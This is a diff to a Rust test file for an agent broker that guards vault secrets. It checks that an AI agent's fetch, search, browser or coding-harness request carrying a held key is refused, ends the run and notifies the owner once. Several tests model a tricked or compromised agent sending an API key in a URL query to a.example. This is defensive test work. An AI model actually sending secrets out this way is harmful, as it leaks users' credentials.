@@ -9,6 +9,10 @@
 //! fetcher, the searcher and the browser do stand in, and each says whether
 //! anything got past the gate.
 //!
+//! A hit ends the agent's run ([`HeldHit`]), so that's proved here too: each
+//! way out in turn, the session on a socket pair, and a chat run in a real
+//! cell whose program goes on as if nothing happened.
+//!
 //! The keeper a broker asks is one for the whole process, so this is a test
 //! binary of its own, with one install that its tests take in turn.
 #![allow(
@@ -22,29 +26,48 @@
 )]
 mod common;
 
+use std::collections::{HashMap, HashSet};
 use std::fmt::Write as _;
 use std::os::unix::fs::PermissionsExt as _;
 use std::os::unix::net::UnixStream;
+use std::path::PathBuf;
 use std::process::{Command, Stdio};
 use std::sync::atomic::{AtomicUsize, Ordering};
 use std::sync::{Arc, Mutex, MutexGuard, OnceLock, PoisonError};
-use std::time::Duration;
+use std::time::{Duration, Instant};
 
 use base64::Engine as _;
-use common::{TestDir, broker_config, test_dir};
+use common::{
+    TestDir, broker_config, guard_cell_available, harness_fixture_binary, mapped_agent_uid,
+    run_fixture_binary, test_dir,
+};
 use hatchling_broker::browser_credentials::{SignIn, SignInAnswer, SignInRequest};
 use hatchling_broker::browser_ops::{Browser, BrowserSession, Browsers, handle_browser_op};
 use hatchling_broker::browser_proxy::Sites;
-use hatchling_broker::held_check::{CHECK_PURPOSE, MAX_CHECK_BYTES};
+use hatchling_broker::chat_run::{Chat, Step, stopped_told};
+use hatchling_broker::harness::HARNESS_CAPABILITY;
+use hatchling_broker::held_check::{CHECK_PURPOSE, HeldHit, MAX_CHECK_BYTES};
 use hatchling_broker::keeper::{self, Keeper};
+use hatchling_broker::schedule_ops::HubDelivery;
 use hatchling_broker::vault_access::{Access, CHECK_ACTION, Caller, Outcome, read_log};
 use hatchling_broker::web_ops::{Fetcher, Searcher, WebSession, handle_web_op};
-use hatchling_broker::{Config, VaultConfig};
+use hatchling_broker::{
+    AgentCell, CellLauncher, Config, Harnesses, RunEnv, SkillRuntime, Skills, VaultConfig,
+    serve_cell_connection, serve_connection_with_ingress,
+};
+use hatchling_channel::{ChannelId, Cleared, LocalHub, Message, OutputGate, SenderId};
 use hatchling_core::browser::{BrowserFailure, PageAction};
+use hatchling_core::framing::{read_frame, read_frame_or_eof, write_frame};
 use hatchling_core::ui::Concealed;
-use hatchling_core::{BrowserOp, BrowserResult, WebOp, WebResult};
+use hatchling_core::{
+    AgentMessage, BrokerMessage, BrowserOp, BrowserResult, CellId, PROTOCOL_VERSION, PeerUid,
+    ScheduleGrant, SessionRequest, SessionResponse, SkillOp, SkillResult, WebOp, WebResult,
+};
 use hatchling_egress::web::FetchError;
+use hatchling_scheduler::{SentTo, Timestamp};
+use hatchling_skill::CodeHash;
 use hatchling_vault::StoreKeys;
+use serde_json::{Value, json};
 
 /// An API key, in the vault under the name a grant reads it by.
 const API_KEY: &str = "sk-egress-no-cell-has-had-0123456";
@@ -256,6 +279,110 @@ fn counting(task: &str) -> (WebSession, Arc<AtomicUsize>) {
     )
 }
 
+/// A web read of `url`.
+fn reading(url: &str) -> WebOp {
+    WebOp::Fetch {
+        url: url.to_owned(),
+        reason: String::from("to read it"),
+    }
+}
+
+/// A hub whose client keeps what the owner is shown.
+fn owners_chat() -> (LocalHub, Arc<Mutex<Vec<String>>>) {
+    let hub = LocalHub::new(OutputGate::disabled());
+    let shown: Arc<Mutex<Vec<String>>> = Arc::default();
+    let seen = Arc::clone(&shown);
+    let _ = hub.attach(Box::new(move |cleared: &Cleared| {
+        if let Ok(mut seen) = seen.lock() {
+            seen.push(cleared.message().text.clone());
+        }
+        Ok(())
+    }));
+    (hub, shown)
+}
+
+/// That `told`, what the owner was shown, holds no secret and no name.
+fn says_nothing_held(told: &[String]) {
+    let names = ["egress-localhost-18089", "mail-work", "short", USERNAME];
+    for line in told {
+        for held in [API_KEY, ACCOUNT_KEY, PASSWORD, SHORT_KEY]
+            .iter()
+            .chain(&names)
+        {
+            assert!(!line.contains(held), "{line}");
+        }
+    }
+}
+
+/// The agent's end of a session on a socket pair, past its hello.
+fn say_hello(agent: &UnixStream, cell: &str) -> Result<(), String> {
+    agent
+        .set_read_timeout(Some(Duration::from_secs(20)))
+        .map_err(|e| e.to_string())?;
+    let hello = AgentMessage::Hello {
+        v: PROTOCOL_VERSION,
+        cell_id: cell.to_owned(),
+    };
+    let bytes = serde_json::to_vec(&hello).map_err(|e| e.to_string())?;
+    write_frame(agent, &bytes).map_err(|e| e.to_string())?;
+    let welcome = read_frame(agent).map_err(|e| e.to_string())?;
+    match serde_json::from_slice(&welcome).map_err(|e| e.to_string())? {
+        BrokerMessage::Welcome { .. } => Ok(()),
+        other @ BrokerMessage::Reject { .. } => Err(format!("{other:?}")),
+    }
+}
+
+/// Closes the agent's end when a test ends, however it ends: the scope a
+/// session runs in can't finish until the session does, and a test that
+/// fails has to fail, not hang.
+struct Hangs<'a>(&'a UnixStream);
+
+impl Drop for Hangs<'_> {
+    fn drop(&mut self) {
+        let _ = self.0.shutdown(std::net::Shutdown::Both);
+    }
+}
+
+/// Sends `request` and gives the broker's answer to it.
+fn answer(agent: &UnixStream, request: &SessionRequest) -> Result<SessionResponse, String> {
+    send(agent, request);
+    let reply = read_frame(agent).map_err(|e| e.to_string())?;
+    serde_json::from_slice(&reply).map_err(|e| e.to_string())
+}
+
+/// Sends `op` and gives the broker's answer to it.
+fn ask(agent: &UnixStream, op: &WebOp) -> Result<SessionResponse, String> {
+    answer(agent, &SessionRequest::Web(op.clone()))
+}
+
+/// Sends `request`, if the connection still takes it: a session that's over
+/// may have shut it already.
+fn send(agent: &UnixStream, request: &SessionRequest) {
+    if let Ok(bytes) = serde_json::to_vec(request) {
+        let _ = write_frame(agent, &bytes);
+    }
+}
+
+/// That the broker closed the session on `agent`, with nothing more asked
+/// of it.
+fn session_closed(agent: &UnixStream) -> Result<(), String> {
+    match read_frame_or_eof(agent) {
+        Ok(None) => Ok(()),
+        other => Err(format!("the session wasn't closed: {other:?}")),
+    }
+}
+
+/// That the session on `agent` answers nothing more: it's closed to it.
+fn session_is_over(agent: &UnixStream) -> Result<(), String> {
+    let next = SessionRequest::Web(reading("https://a.example/?k=nothing-held"));
+    send(agent, &next);
+    match read_frame_or_eof(agent) {
+        Ok(None) => Ok(()),
+        Err(error) if error.to_string().contains("reset") => Ok(()),
+        other => Err(format!("the session answered: {other:?}")),
+    }
+}
+
 /// A browser that never starts: the gate is what's asked of it.
 struct NoBrowsers;
 
@@ -462,5 +589,306 @@ fn a_key_no_cell_has_had_is_never_gone_to() -> Result<(), String> {
         "a clean text is not refused for a secret"
     );
     install.last_check_found(false)?;
+    Ok(())
+}
+
+/// Every way the agent's own text leaves ends its run on a hit, and says
+/// where it was going. A clean text ends nothing, and nor does a check the
+/// keeper can't answer: nothing says that one held a secret.
+#[test]
+fn a_hit_ends_the_run_each_way_out_and_nothing_else_does() -> Result<(), String> {
+    let install = install()?;
+    let searcher: Searcher = Arc::new(|_| Ok(Vec::new()));
+    let ways: [(WaySent, SentTo); 4] = [
+        (
+            WaySent::Web(WebOp::Fetch {
+                url: format!("https://a.example/?k={API_KEY}"),
+                reason: String::from("to read it"),
+            }),
+            SentTo::Website,
+        ),
+        (
+            WaySent::Web(WebOp::Search {
+                query: format!("what is {ACCOUNT_KEY}"),
+            }),
+            SentTo::Search,
+        ),
+        (
+            WaySent::Browser(BrowserOp::Open {
+                url: format!("https://a.example/{}", escaped(PASSWORD)),
+                reason: String::from("to read it"),
+            }),
+            SentTo::Website,
+        ),
+        (WaySent::Browser(typing(SHORT_KEY)), SentTo::Page),
+    ];
+    for (way, to) in ways {
+        let hit = HeldHit::default();
+        let (web, _) = counting("each-way");
+        let mut web = web.searching(Arc::clone(&searcher)).in_run(hit.clone());
+        let mut browser = browsing();
+        way.go(&install, &mut web, &mut browser);
+        assert_eq!(hit.seen(), Some(to), "{way:?}");
+        install.last_check_found(true)?;
+    }
+
+    let hit = HeldHit::default();
+    let (web, _) = counting("clean");
+    let mut web = web.searching(Arc::clone(&searcher)).in_run(hit.clone());
+    let mut browser = browsing();
+    let length = usize::try_from(MAX_CHECK_BYTES + 1).map_err(|e| e.to_string())?;
+    for way in [
+        WaySent::Web(reading("https://a.example/?k=nothing-held")),
+        WaySent::Web(WebOp::Search {
+            query: String::from("nothing held"),
+        }),
+        WaySent::Web(WebOp::Search {
+            query: "x".repeat(length),
+        }),
+        WaySent::Browser(typing("nothing held")),
+    ] {
+        way.go(&install, &mut web, &mut browser);
+        assert_eq!(hit.seen(), None, "{way:?}");
+    }
+    Ok(())
+}
+
+/// One op on the way out.
+#[derive(Debug)]
+enum WaySent {
+    Web(WebOp),
+    Browser(BrowserOp),
+}
+
+impl WaySent {
+    fn go(&self, install: &Install, web: &mut WebSession, browser: &mut BrowserSession) {
+        match self {
+            Self::Web(op) => {
+                let _ = handle_web_op(&install.config, &install.keys, web, op);
+            }
+            Self::Browser(op) => {
+                let _ = handle_browser_op(&install.config, &install.keys, web, browser, op);
+            }
+        }
+    }
+}
+
+/// The attack: a tricked agent tries a guess in an address. A hit is on the
+/// keeper's record, is answered as ever, and is the last thing the session
+/// does: it's closed to the agent, though the broker's end is still open,
+/// and the owner is told once, in words that hold no secret and no name. A
+/// clean read before it went on as usual.
+#[test]
+fn a_hit_ends_the_session_and_the_owner_is_told_once() -> Result<(), String> {
+    let install = install()?;
+    let mut config = install.config.clone();
+    config.agent_uid = PeerUid::from_kernel(rustix::process::getuid().as_raw());
+    let (hub, shown) = owners_chat();
+    let (agent, broker) = UnixStream::pair().map_err(|e| e.to_string())?;
+    std::thread::scope(|scope| {
+        let _hangs = Hangs(&agent);
+        let (config, keys, hub, broker) = (&config, &install.keys, &hub, &broker);
+        let served = scope.spawn(move || {
+            serve_connection_with_ingress(broker, config, keys, &Skills::default(), Some(hub))
+                .map_err(|e| e.to_string())
+        });
+        say_hello(&agent, "cell-guessing")?;
+        let clean = ask(&agent, &reading("https://a.example/?k=nothing-held"))?;
+        assert!(
+            matches!(clean, SessionResponse::Web(WebResult::Waiting { .. })),
+            "{clean:?}"
+        );
+        install.last_check_found(false)?;
+        let guess = format!("https://a.example/?k={API_KEY}");
+        assert_eq!(
+            ask(&agent, &reading(&guess))?,
+            SessionResponse::Web(WebResult::Refused {
+                reason: String::from(ADDRESS_HOLDS)
+            })
+        );
+        install.last_check_found(true)?;
+        let checks = install.checks()?.len();
+        session_closed(&agent)?;
+        session_is_over(&agent)?;
+        served
+            .join()
+            .map_err(|_| String::from("the session panicked"))??;
+        assert_eq!(install.checks()?.len(), checks, "the next op wasn't read");
+        Ok::<(), String>(())
+    })?;
+    let told = shown.lock().map_err(|e| e.to_string())?.clone();
+    assert_eq!(told, [stopped_told(SentTo::Website)]);
+    says_nothing_held(&told);
+    Ok(())
+}
+
+/// A harness's brief is one more way out, and the agent's own text: through
+/// a real session, a key in it stops the run as an address does, and the
+/// owner's told it was a coding tool.
+#[test]
+fn a_brief_holding_a_key_ends_the_session() -> Result<(), String> {
+    let install = install()?;
+    let dir: PathBuf = install.dir.join("harness");
+    std::fs::create_dir_all(dir.join("project/src")).map_err(|e| e.to_string())?;
+    std::fs::write(dir.join("project/src/lib.rs"), "pub fn a() {}\n").map_err(|e| e.to_string())?;
+    let binary = dir.join("harness");
+    std::fs::copy(harness_fixture_binary()?, &binary).map_err(|e| e.to_string())?;
+    let sha256 = CodeHash::of(&std::fs::read(&binary).map_err(|e| e.to_string())?).to_string();
+    let mut config = install.config.clone();
+    config.agent_uid = PeerUid::from_kernel(rustix::process::getuid().as_raw());
+    config.artifacts.workspace = Some(install.dir.join("tmp"));
+    config.scheduler.root = dir.join("schedules");
+    let code: HashSet<_> = [HARNESS_CAPABILITY.parse().map_err(|_| "cap")?].into();
+    config.skills.grants = HashMap::from([(String::from("claude-code"), code)]);
+    let vars = HashMap::from([
+        (
+            "HATCHLING_HARNESS_CLAUDE_CODE",
+            binary.display().to_string(),
+        ),
+        ("HATCHLING_HARNESS_CLAUDE_CODE_SHA256", sha256),
+        (
+            "HATCHLING_HARNESS_ROOTS",
+            format!("project={}", dir.join("project").display()),
+        ),
+    ]);
+    let harnesses =
+        Harnesses::parse(&config, |key| vars.get(key).cloned()).map_err(|e| e.to_string())?;
+    let skills = Skills::default()
+        .with_runtime(SkillRuntime::new(PathBuf::from(
+            "/nonexistent/hatchling-spawner",
+        )))
+        .with_harnesses(harnesses);
+    let (hub, shown) = owners_chat();
+    let (agent, broker) = UnixStream::pair().map_err(|e| e.to_string())?;
+    let request = SessionRequest::Skill(SkillOp::Invoke {
+        skill: String::from("claude-code@1"),
+        capability: "code".parse().map_err(|_| "capability")?,
+        input: json!({
+            "task": format!("Log in with {API_KEY}."),
+            "root": "project",
+            "paths": ["src/lib.rs"],
+        })
+        .to_string(),
+    });
+    std::thread::scope(|scope| {
+        let _hangs = Hangs(&agent);
+        let (config, keys, hub, broker, skills) = (&config, &install.keys, &hub, &broker, &skills);
+        let served = scope.spawn(move || {
+            serve_connection_with_ingress(broker, config, keys, skills, Some(hub))
+                .map_err(|e| e.to_string())
+        });
+        say_hello(&agent, "cell-briefing")?;
+        let reply = answer(&agent, &request)?;
+        let SessionResponse::Skill(SkillResult::Output { output }) = reply else {
+            return Err(format!("no report: {reply:?}"));
+        };
+        let report: Value = serde_json::from_str(&output).map_err(|e| e.to_string())?;
+        assert_eq!(report.get("outcome"), Some(&json!("refused")), "{report}");
+        session_closed(&agent)?;
+        session_is_over(&agent)?;
+        served
+            .join()
+            .map_err(|_| String::from("the session panicked"))?
+    })?;
+    let told = shown.lock().map_err(|e| e.to_string())?.clone();
+    assert_eq!(told, [stopped_told(SentTo::Harness)]);
+    says_nothing_held(&told);
+    Ok(())
+}
+
+/// A hit elsewhere in a run's tree stops a session that did nothing wrong:
+/// its next op is refused unread, whatever it is. A run's session has no
+/// local channel, so it tells no one: what watches the run does, once.
+#[test]
+fn a_hit_elsewhere_in_the_tree_refuses_the_next_op() -> Result<(), String> {
+    let install = install()?;
+    let cell_id: CellId = "cell-sibling".parse().map_err(|_| "cell id")?;
+    let (agent, connection) = UnixStream::pair().map_err(|e| e.to_string())?;
+    let cell = AgentCell {
+        connection,
+        cell_id,
+        pid: 0,
+    };
+    let hit = HeldHit::default();
+    std::thread::scope(|scope| {
+        let _hangs = Hangs(&agent);
+        let (hit, cell, config, keys) = (&hit, &cell, &install.config, &install.keys);
+        let served = scope.spawn(move || {
+            serve_cell_connection(cell, config, keys, &Skills::default(), None, None, hit)
+                .map_err(|e| e.to_string())
+        });
+        say_hello(&agent, "cell-sibling")?;
+        let clean = ask(&agent, &reading("https://a.example/?k=nothing-held"))?;
+        assert!(
+            matches!(clean, SessionResponse::Web(WebResult::Waiting { .. })),
+            "{clean:?}"
+        );
+        hit.record(SentTo::Search);
+        let checks = install.checks()?.len();
+        session_is_over(&agent)?;
+        served
+            .join()
+            .map_err(|_| String::from("the session panicked"))??;
+        assert_eq!(install.checks()?.len(), checks, "unread");
+        Ok::<(), String>(())
+    })
+}
+
+/// End to end, with nothing standing in for the keeper or the cell: a chat
+/// run's program sends a key in an address, then goes on spinning as a
+/// compromised one would. The broker ends the run anyway, long before its
+/// time, kills its cell, and shows the owner one sentence: nothing it wrote.
+#[test]
+fn a_chat_run_that_sends_a_key_is_stopped_and_the_owner_told_once() -> Result<(), String> {
+    if !guard_cell_available()? {
+        return Ok(());
+    }
+    let install = install()?;
+    let mut config = install.config.clone();
+    config.agent_uid = PeerUid::from_kernel(mapped_agent_uid());
+    config.scheduler.root = install.dir.join("schedules");
+    let runs = RunEnv {
+        spawner: common::spawner(),
+        agent_bin: run_fixture_binary()?,
+        run_root: config.scheduler.run_root(),
+        timeout: Duration::from_secs(120),
+    };
+    let (hub, shown) = owners_chat();
+    let delivery = HubDelivery::new(Some(&hub));
+    let send = ScheduleGrant::ChannelSend {
+        channel: String::from("local"),
+    };
+    let task = format!("fetch:https://a.example/?k={API_KEY} hang");
+    let started = Instant::now();
+    std::thread::scope(|scope| {
+        let launcher = CellLauncher::new(scope, &config, &install.keys, runs.clone());
+        let mut chat = Chat::new(vec![send]);
+        let mut message = Some((
+            Message {
+                sender: SenderId(String::from("api")),
+                channel: ChannelId::local(),
+                text: task.clone(),
+            },
+            0,
+        ));
+        loop {
+            let step = chat.step(|| message.take(), 0, &launcher, &delivery, Timestamp::now());
+            if step == Step::Answered {
+                return Ok(());
+            }
+            if started.elapsed() > Duration::from_secs(60) {
+                return Err(format!("the run wasn't stopped: {step:?}"));
+            }
+            std::thread::sleep(Duration::from_millis(50));
+        }
+    })?;
+    install.last_check_found(true)?;
+    let told = shown.lock().map_err(|e| e.to_string())?.clone();
+    assert_eq!(told, [stopped_told(SentTo::Website)]);
+    says_nothing_held(&told);
+    let left = std::fs::read_dir(&runs.run_root)
+        .map_err(|e| e.to_string())?
+        .count();
+    assert_eq!(left, 0, "the run's directory went with it");
     Ok(())
 }
